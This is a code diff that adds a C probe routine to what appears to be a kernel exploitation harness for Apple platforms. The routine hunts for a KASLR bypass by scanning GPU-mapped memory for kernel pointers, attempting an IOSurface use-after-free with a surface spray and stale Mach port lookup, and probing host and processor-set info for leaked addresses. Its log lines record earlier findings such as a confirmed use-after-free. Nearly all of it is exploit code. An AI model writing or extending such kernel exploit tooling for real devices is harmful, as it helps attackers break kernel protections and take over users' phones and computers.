@@ -14472,6 +14472,482 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
+static void r352_probe(void) {
+    rlog("\n=== r352: KASLR Bypass — AGX Deep Scan + UAF Property Leak ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    #define IS_KPTR352(v) ( \
+        ((v) != 0) && ((v) != 0xFFFFFFFFFFFFFFFFULL) && \
+        ((v) != 0xFFFFFFFF00000000ULL) && ((v) != 0xFFFFFFFF00000001ULL) && \
+        ( ((v) & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL ) \
+    )
+
+    /* ---- Part 1: AGX VM region deep scan with KASLR correlation ---- */
+    rlog("--- Part 1: AGX VM deep scan (2 passes, check for KASLR-dependent values) ---\n");
+    fflush(stdout);
+
+    uint64_t pass1_vals[64];
+    uint64_t pass1_addrs[64];
+    int pass1_count = 0;
+
+    for (int pass = 0; pass < 2; pass++) {
+        rlog("  Pass %d:\n", pass);
+
+        void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+        if (!metal_lib) { rlog("  Metal: failed\n"); continue; }
+
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+        void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+        if (!createDev || !msgSend || !regSel) { dlclose(metal_lib); continue; }
+
+        void *dev = createDev();
+        if (!dev) { dlclose(metal_lib); continue; }
+
+        void *selNewCQ = regSel("newCommandQueue");
+        void *cmdQ = ((void*(*)(void*,void*))msgSend)(dev, selNewCQ);
+
+        /* Create multiple shared buffers to maximize GPU state */
+        void *selNewBuf = regSel("newBufferWithLength:options:");
+        size_t bufSizes[] = {4096, 16384, 65536, 262144};
+        void *bufs[4] = {0};
+        for (int b = 0; b < 4; b++) {
+            bufs[b] = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                dev, selNewBuf, bufSizes[b], 0UL);
+        }
+
+        /* Encode and commit a blit operation to trigger GPU work */
+        if (cmdQ) {
+            void *selNewCB = regSel("commandBuffer");
+            void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, selNewCB);
+            if (cmdBuf) {
+                void *selBlit = regSel("blitCommandEncoder");
+                void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf, selBlit);
+                if (blit && bufs[2]) {
+                    void *selFill = regSel("fillBuffer:range:value:");
+                    typedef struct { unsigned long loc; unsigned long len; } NSRange352;
+                    NSRange352 rng = {0, 65536};
+                    ((void(*)(void*,void*,void*,NSRange352,uint8_t))msgSend)(
+                        blit, selFill, bufs[2], rng, 0xCC);
+                    void *selEnd = regSel("endEncoding");
+                    ((void(*)(void*,void*))msgSend)(blit, selEnd);
+                }
+                void *selCommit = regSel("commit");
+                ((void(*)(void*,void*))msgSend)(cmdBuf, selCommit);
+                void *selWait = regSel("waitUntilCompleted");
+                ((void(*)(void*,void*))msgSend)(cmdBuf, selWait);
+            }
+        }
+
+        /* Now scan ALL VM regions, focus on ones with interesting values */
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        int regions = 0;
+        int found = 0;
+
+        while (regions < 600) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz,
+                &depth, (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            if ((info.protection & VM_PROT_READ) && sz <= 2097152 && sz > 0) {
+                uint64_t *rp = (uint64_t *)(uintptr_t)addr;
+                size_t rqw = (size_t)sz / 8;
+                if (rqw > 262144) rqw = 262144;
+
+                for (size_t i = 0; i < rqw; i++) {
+                    uint64_t v = *(volatile uint64_t *)&rp[i];
+                    if (IS_KPTR352(v)) {
+                        if (pass == 0 && pass1_count < 64) {
+                            pass1_vals[pass1_count] = v;
+                            pass1_addrs[pass1_count] = addr + i*8;
+                            pass1_count++;
+                        }
+                        if (pass == 0) {
+                            rlog("    [%d] vm=0x%llx+%zu val=0x%llx tag=%u prot=%x\n",
+                                found, (unsigned long long)addr, i*8,
+                                (unsigned long long)v, info.user_tag, info.protection);
+                        } else {
+                            /* Pass 2: check if same address has same value */
+                            int matched = 0;
+                            for (int p1 = 0; p1 < pass1_count; p1++) {
+                                if (pass1_addrs[p1] == addr + i*8) {
+                                    if (pass1_vals[p1] != v) {
+                                        rlog("    *** CHANGED vm=0x%llx+%zu: 0x%llx -> 0x%llx ***\n",
+                                            (unsigned long long)addr, i*8,
+                                            (unsigned long long)pass1_vals[p1],
+                                            (unsigned long long)v);
+                                    } else {
+                                        rlog("    [stable] vm=0x%llx+%zu=0x%llx\n",
+                                            (unsigned long long)addr, i*8,
+                                            (unsigned long long)v);
+                                    }
+                                    matched = 1;
+                                    break;
+                                }
+                            }
+                            if (!matched) {
+                                rlog("    [new] vm=0x%llx+%zu=0x%llx\n",
+                                    (unsigned long long)addr, i*8,
+                                    (unsigned long long)v);
+                            }
+                        }
+                        found++;
+                        if (found >= 50) break;
+                    }
+                }
+            }
+            addr += sz;
+            regions++;
+            if (found >= 50) break;
+        }
+        rlog("  Pass %d: %d candidates in %d regions\n\n", pass, found, regions);
+
+        /* Release Metal resources */
+        void *selRelease = regSel("release");
+        for (int b = 0; b < 4; b++) {
+            if (bufs[b]) ((void(*)(void*,void*))msgSend)(bufs[b], selRelease);
+        }
+        if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, selRelease);
+        dlclose(metal_lib);
+    }
+
+    /* ---- Part 2: IOSurface UAF cross-read full property dump ---- */
+    rlog("--- Part 2: IOSurface UAF cross-read property leak ---\n");
+    rlog("  Using stale client to CopyAllValues from replacement surface\n");
+    fflush(stdout);
+    {
+        /* Create surface A (victim) */
+        CFMutableDictionaryRef pa = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int wa=64, ha=64, bpea=4, bpra=256, pfa=0x42475241, asa=64*64*4;
+        CFNumberRef n1=CFNumberCreate(NULL,kCFNumberIntType,&wa);
+        CFNumberRef n2=CFNumberCreate(NULL,kCFNumberIntType,&ha);
+        CFNumberRef n3=CFNumberCreate(NULL,kCFNumberIntType,&bpea);
+        CFNumberRef n4=CFNumberCreate(NULL,kCFNumberIntType,&bpra);
+        CFNumberRef n5=CFNumberCreate(NULL,kCFNumberIntType,&pfa);
+        CFNumberRef n6=CFNumberCreate(NULL,kCFNumberIntType,&asa);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceWidth"),n1);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceHeight"),n2);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceBytesPerElement"),n3);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceBytesPerRow"),n4);
+        CFDictionarySetValue(pa,CFSTR("IOSurfacePixelFormat"),n5);
+        CFDictionarySetValue(pa,CFSTR("IOSurfaceAllocSize"),n6);
+        CFRelease(n1);CFRelease(n2);CFRelease(n3);CFRelease(n4);CFRelease(n5);CFRelease(n6);
+
+        IOSurfaceRef surfA = IOSurfaceCreate(pa);
+        CFRelease(pa);
+        if (!surfA) {
+            rlog("  surfA create failed\n");
+            goto r352_part3;
+        }
+
+        uint32_t idA = IOSurfaceGetID(surfA);
+        rlog("  surfA id=%u\n", idA);
+
+        /* Get stale pointer by locking then incrementing ref in a way we can free */
+        IOSurfaceLock(surfA, 0, NULL);
+        void *baseA = IOSurfaceGetBaseAddress(surfA);
+        IOSurfaceUnlock(surfA, 0, NULL);
+
+        /* Create a Mach port for surfA, then release surfA */
+        mach_port_t portA = IOSurfaceCreateMachPort(surfA);
+
+        /* Now create surface B with same alloc size — should reuse ID after A is released */
+        CFRelease(surfA);
+        surfA = NULL;
+
+        /* Spray surfaces to try to reuse the ID */
+        IOSurfaceRef surfB = NULL;
+        uint32_t idB = 0;
+        for (int spray = 0; spray < 20; spray++) {
+            CFMutableDictionaryRef pb = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int wb=128, hb=128, bpeb=4, bprb=512, pfb=0x42475241, asb=128*128*4;
+            CFNumberRef nb1=CFNumberCreate(NULL,kCFNumberIntType,&wb);
+            CFNumberRef nb2=CFNumberCreate(NULL,kCFNumberIntType,&hb);
+            CFNumberRef nb3=CFNumberCreate(NULL,kCFNumberIntType,&bpeb);
+            CFNumberRef nb4=CFNumberCreate(NULL,kCFNumberIntType,&bprb);
+            CFNumberRef nb5=CFNumberCreate(NULL,kCFNumberIntType,&pfb);
+            CFNumberRef nb6=CFNumberCreate(NULL,kCFNumberIntType,&asb);
+            CFDictionarySetValue(pb,CFSTR("IOSurfaceWidth"),nb1);
+            CFDictionarySetValue(pb,CFSTR("IOSurfaceHeight"),nb2);
+            CFDictionarySetValue(pb,CFSTR("IOSurfaceBytesPerElement"),nb3);
+            CFDictionarySetValue(pb,CFSTR("IOSurfaceBytesPerRow"),nb4);
+            CFDictionarySetValue(pb,CFSTR("IOSurfacePixelFormat"),nb5);
+            CFDictionarySetValue(pb,CFSTR("IOSurfaceAllocSize"),nb6);
+            CFRelease(nb1);CFRelease(nb2);CFRelease(nb3);CFRelease(nb4);CFRelease(nb5);CFRelease(nb6);
+
+            IOSurfaceRef s = IOSurfaceCreate(pb);
+            CFRelease(pb);
+            if (!s) continue;
+
+            /* Set test properties on this surface with large data values */
+            int64_t bigval = 0x4141414141414141LL;
+            CFNumberRef bv = CFNumberCreate(NULL, kCFNumberSInt64Type, &bigval);
+            IOSurfaceSetValue(s, CFSTR("TestProp1"), bv);
+            CFRelease(bv);
+
+            /* Also set a large data property */
+            uint8_t bigdata[256];
+            memset(bigdata, 0x42, sizeof(bigdata));
+            CFDataRef bd = CFDataCreate(NULL, bigdata, sizeof(bigdata));
+            IOSurfaceSetValue(s, CFSTR("TestData1"), bd);
+            CFRelease(bd);
+
+            if (!surfB) { surfB = s; idB = IOSurfaceGetID(s); }
+            else CFRelease(s);
+        }
+
+        rlog("  surfB id=%u (surfA was id=%u)\n", idB, idA);
+
+        /* Now try to look up surfA via the mach port — it should reconstruct a client */
+        if (portA != MACH_PORT_NULL) {
+            IOSurfaceRef lookupA = IOSurfaceLookupFromMachPort(portA);
+            if (lookupA) {
+                uint32_t idLookup = IOSurfaceGetID(lookupA);
+                rlog("  Lookup via portA: id=%u (expected %u)\n", idLookup, idA);
+
+                /* Try CopyAllValues on the looked-up surface */
+                CFDictionaryRef allVals = IOSurfaceCopyAllValues(lookupA);
+                if (allVals) {
+                    CFIndex propCnt = CFDictionaryGetCount(allVals);
+                    rlog("  CopyAllValues (lookup): %ld properties\n", (long)propCnt);
+
+                    const void **keys = (const void **)malloc(propCnt * sizeof(void*));
+                    const void **vals = (const void **)malloc(propCnt * sizeof(void*));
+                    CFDictionaryGetKeysAndValues(allVals, keys, vals);
+
+                    for (CFIndex i = 0; i < propCnt; i++) {
+                        char kbuf[128] = {0};
+                        CFStringGetCString(keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+
+                        if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
+                            int64_t nv = 0;
+                            CFNumberGetValue(vals[i], kCFNumberSInt64Type, &nv);
+                            rlog("    '%s' = 0x%llx\n", kbuf, (unsigned long long)nv);
+                            if (IS_KPTR352((uint64_t)nv)) {
+                                rlog("    *** KPTR property '%s'=0x%llx ***\n", kbuf,
+                                    (unsigned long long)nv);
+                            }
+                        } else if (CFGetTypeID(vals[i]) == CFDataGetTypeID()) {
+                            CFIndex dlen = CFDataGetLength(vals[i]);
+                            rlog("    '%s' = <data %ld bytes>\n", kbuf, (long)dlen);
+                            if (dlen >= 8) {
+                                const uint64_t *dp = (const uint64_t *)CFDataGetBytePtr(vals[i]);
+                                for (CFIndex j = 0; j < dlen/8 && j < 32; j++) {
+                                    if (IS_KPTR352(dp[j])) {
+                                        rlog("    *** KPTR data '%s'+%lld=0x%llx ***\n",
+                                            kbuf, (long long)(j*8), (unsigned long long)dp[j]);
+                                    }
+                                }
+                            }
+                        } else if (CFGetTypeID(vals[i]) == CFStringGetTypeID()) {
+                            char sbuf[256] = {0};
+                            CFStringGetCString(vals[i], sbuf, sizeof(sbuf), kCFStringEncodingUTF8);
+                            rlog("    '%s' = \"%s\"\n", kbuf, sbuf);
+                        }
+                    }
+                    free(keys);
+                    free(vals);
+                    CFRelease(allVals);
+                } else {
+                    rlog("  CopyAllValues returned NULL\n");
+                }
+
+                /* Also try specific internal property keys */
+                const char *internal_keys[] = {
+                    "IOSurfaceAllocSize", "IOSurfaceAddress",
+                    "IOSurfaceGlobalUseCount", "IOSurfacePurgeableState",
+                    "IOSurfaceIsInUse", "IOSurfaceOffset",
+                    "IOSurfaceMapCacheAttribute", "IOSurfacePlaneInfo",
+                    "IOSurfaceRegistryID", "IOSurfaceKernelAddress",
+                    NULL
+                };
+                for (int k = 0; internal_keys[k]; k++) {
+                    CFStringRef key = CFStringCreateWithCString(NULL, internal_keys[k],
+                        kCFStringEncodingUTF8);
+                    CFTypeRef val = IOSurfaceCopyValue(lookupA, key);
+                    if (val) {
+                        if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                            int64_t nv = 0;
+                            CFNumberGetValue(val, kCFNumberSInt64Type, &nv);
+                            rlog("  Internal '%s' = 0x%llx%s\n", internal_keys[k],
+                                (unsigned long long)nv,
+                                IS_KPTR352((uint64_t)nv) ? " *** KPTR ***" : "");
+                        } else {
+                            rlog("  Internal '%s' = (type %lu)\n", internal_keys[k],
+                                CFGetTypeID(val));
+                        }
+                        CFRelease(val);
+                    }
+                }
+
+                CFRelease(lookupA);
+            } else {
+                rlog("  LookupFromMachPort: NULL (surface freed)\n");
+            }
+            mach_port_deallocate(mach_task_self(), portA);
+        }
+        if (surfB) CFRelease(surfB);
+    }
+
+    r352_part3:
+
+    /* ---- Part 3: IOSurface obj_id oracle ---- */
+    rlog("\n--- Part 3: IOSurface VM object_id stability test ---\n");
+    rlog("  If obj_id encodes lower bits of kernel VA, it reveals zone allocator base\n");
+    fflush(stdout);
+    {
+        for (int trial = 0; trial < 3; trial++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=256, h=256, bpe=4, bpr=1024, pf=0x42475241, as=256*256*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (!s) { rlog("  trial %d: create failed\n", trial); continue; }
+
+            IOSurfaceLock(s, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(s);
+            if (base) {
+                mach_vm_address_t raddr = (mach_vm_address_t)(uintptr_t)base;
+                mach_vm_size_t rsz = 0;
+                uint32_t depth = 0;
+                struct vm_region_submap_info_64 rinfo;
+                mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kr = mach_vm_region_recurse(mach_task_self(), &raddr, &rsz, &depth,
+                    (vm_region_recurse_info_t)&rinfo, &rcnt);
+                if (kr == 0) {
+                    rlog("  trial %d: id=%u obj_id=0x%08x (%u) base=%p raddr=0x%llx\n",
+                        trial, IOSurfaceGetID(s), rinfo.object_id, rinfo.object_id,
+                        base, (unsigned long long)raddr);
+                }
+            }
+            IOSurfaceUnlock(s, 0, NULL);
+            CFRelease(s);
+        }
+    }
+
+    /* ---- Part 4: Thread state scan for stale kernel values ---- */
+    rlog("\n--- Part 4: Thread state + host_info kernel data scan ---\n");
+    fflush(stdout);
+    {
+        /* host_info — some flavors may leak kernel data */
+        host_t host = mach_host_self();
+        uint32_t flavors[] = {1, 2, 3, 4, 5, 6, 10, 11, 12, 13, 14};
+        for (int f = 0; f < 11; f++) {
+            uint64_t hinfo[32];
+            memset(hinfo, 0, sizeof(hinfo));
+            mach_msg_type_number_t hcnt = sizeof(hinfo)/sizeof(natural_t);
+            kr = host_info(host, flavors[f], (host_info_t)hinfo, &hcnt);
+            if (kr == 0 && hcnt > 0) {
+                for (uint32_t i = 0; i < hcnt/2 && i < 16; i++) {
+                    if (IS_KPTR352(hinfo[i])) {
+                        rlog("  *** KPTR host_info flavor=%u [%u]=0x%llx ***\n",
+                            flavors[f], i, (unsigned long long)hinfo[i]);
+                    }
+                }
+            }
+        }
+
+        /* processor_set_info */
+        processor_set_name_t pset;
+        kr = host_processor_set_priv(host, &pset);
+        if (kr == 0) {
+            uint64_t pinfo[32];
+            memset(pinfo, 0, sizeof(pinfo));
+            mach_msg_type_number_t pcnt = sizeof(pinfo)/sizeof(natural_t);
+            kr = processor_set_info(pset, 1, &host, (processor_set_info_t)pinfo, &pcnt);
+            if (kr == 0) {
+                for (uint32_t i = 0; i < pcnt/2 && i < 16; i++) {
+                    if (IS_KPTR352(pinfo[i])) {
+                        rlog("  *** KPTR pset_info[%u]=0x%llx ***\n",
+                            i, (unsigned long long)pinfo[i]);
+                    }
+                }
+            }
+            rlog("  processor_set_info: kr=0x%x cnt=%u\n", kr, pcnt);
+        } else {
+            rlog("  host_processor_set_priv: kr=0x%x\n", kr);
+        }
+
+        /* vm_allocate + vm_read to scan our own task's memory map edge */
+        mach_vm_address_t scan_addr = 0;
+        mach_vm_size_t scan_sz = 0;
+        uint32_t scan_depth = 0;
+        struct vm_region_submap_info_64 scan_info;
+        mach_msg_type_number_t scan_cnt;
+        int region_num = 0;
+
+        /* Look specifically for regions with user_tag indicating IOKit shared mem */
+        scan_addr = 0;
+        while (region_num < 500) {
+            scan_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            scan_depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &scan_addr, &scan_sz,
+                &scan_depth, (vm_region_recurse_info_t)&scan_info, &scan_cnt);
+            if (kr != 0) break;
+
+            /* user_tag 46 = IOKit, 88 = IOSurface, 240-255 = GPU */
+            if (scan_info.user_tag == 46 || (scan_info.user_tag >= 240 && scan_info.user_tag <= 255)) {
+                rlog("  IOKit/GPU region: 0x%llx sz=0x%llx tag=%u prot=%x obj_id=0x%x\n",
+                    (unsigned long long)scan_addr, (unsigned long long)scan_sz,
+                    scan_info.user_tag, scan_info.protection, scan_info.object_id);
+
+                if ((scan_info.protection & VM_PROT_READ) && scan_sz <= 1048576) {
+                    uint64_t *rp = (uint64_t *)(uintptr_t)scan_addr;
+                    size_t rqw = (size_t)scan_sz / 8;
+                    if (rqw > 131072) rqw = 131072;
+                    int found = 0;
+                    for (size_t i = 0; i < rqw && found < 10; i++) {
+                        uint64_t v = *(volatile uint64_t *)&rp[i];
+                        if (IS_KPTR352(v)) {
+                            rlog("    +%zu = 0x%llx\n", i*8, (unsigned long long)v);
+                            found++;
+                        }
+                    }
+                }
+            }
+            scan_addr += scan_sz;
+            region_num++;
+        }
+        rlog("  Scanned %d regions for IOKit/GPU tags\n", region_num);
+    }
+
+    /* Write state file */
+    {
+        uint32_t state[4] = {0xDEAD0352, 0, 0, 0};
+        FILE *sf = fopen("r352_state.bin", "wb");
+        if (sf) { fwrite(state, 1, sizeof(state), sf); fclose(sf); }
+    }
+
+    rlog("\n=== r352 complete ===\n");
+    fflush(stdout);
+    #undef IS_KPTR352
+}
+
 static void r351_probe(void) {
     rlog("\n=== r351: KASLR Bypass — Exhaustive kptr Leak Hunt ===\n\n");
     fflush(stdout);
@@ -49624,6 +50100,15 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 355) {
+            rlog("*** rounds=355: KASLR Bypass — AGX Deep Scan + UAF Property Leak ***\n");
+            rlog("  r351: 30 candidates, mostly sentinels. 2 real: 0xfffffffffb440e00,\n");
+            rlog("  0xfffffc820e008100 in AGX regions. Need to verify KASLR dependency.\n");
+            rlog("  Also: IOSurface UAF CopyAllValues, obj_id oracle, host_info scan.\n\n");
+            fflush(stdout);
+            r352_probe();
+            goto done;
+        }
         if (rounds == 354) {
             rlog("*** rounds=354: KASLR Bypass — Exhaustive kptr Leak Hunt ***\n");
             rlog("  r298: Userspace UAF confirmed. All conv. leaks patched.\n");
@@ -51667,7 +52152,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -61509,7 +61994,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
